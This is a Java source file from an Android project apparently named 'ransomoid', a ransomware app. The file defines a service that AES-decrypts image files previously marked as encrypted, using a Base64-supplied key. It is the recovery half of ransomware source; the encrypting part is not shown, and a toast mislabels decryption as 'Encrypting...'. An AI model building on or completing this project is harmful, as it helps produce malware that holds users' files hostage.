package falezza.fabio.ransomoid.services;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Base64;
import android.widget.Toast;

import java.io.File;

import falezza.fabio.ransomoid.utils.AesEncrypter;
import falezza.fabio.ransomoid.utils.FileProcessor;

public class DecryptService extends ParentService {

    private String key;

    public DecryptService(String key) {
        this.key = key;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        this.decrypt();
    }

    private void decrypt() {
        Toast.makeText(this, "Encrypting...", Toast.LENGTH_LONG).show();
        try {
            AesEncrypter aesEncrypter = AesEncrypter.getInstance();
            aesEncrypter.setKey(Base64.decode(this.key, 0));
            for (File img: this.imgList) {
                if (isEncrypted(img)) {
                    aesEncrypter.setFile(img);
                    aesEncrypter.decrypt();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
